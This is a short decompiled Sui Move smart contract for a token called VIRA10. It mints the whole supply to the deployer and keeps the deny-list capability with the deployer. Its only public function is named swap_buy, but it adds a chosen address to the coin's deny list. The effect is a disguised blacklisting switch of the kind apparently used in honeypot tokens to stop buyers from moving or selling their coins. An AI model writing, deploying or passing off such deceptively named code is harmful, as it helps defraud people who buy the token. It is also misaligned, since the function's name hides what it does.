module 0x7178393941a5c6c1afd6dd97bd120dbd8ca595f7ac67af6f921497ecd8679ad4::vira10 {
    struct VIRA10 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: VIRA10, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<VIRA10>(arg0, 9, b"Vira10", b"VIORA IS ONLINE", x"f09f91be2056494f5241204953204f4e4c494e4520f09f8c90", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmTAM9X8EzuiFXWGdjjHpqxAMjbug2TwuF1iKSpedzTmhx"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<VIRA10>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<VIRA10>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<VIRA10>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<VIRA10>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<VIRA10>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<VIRA10>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

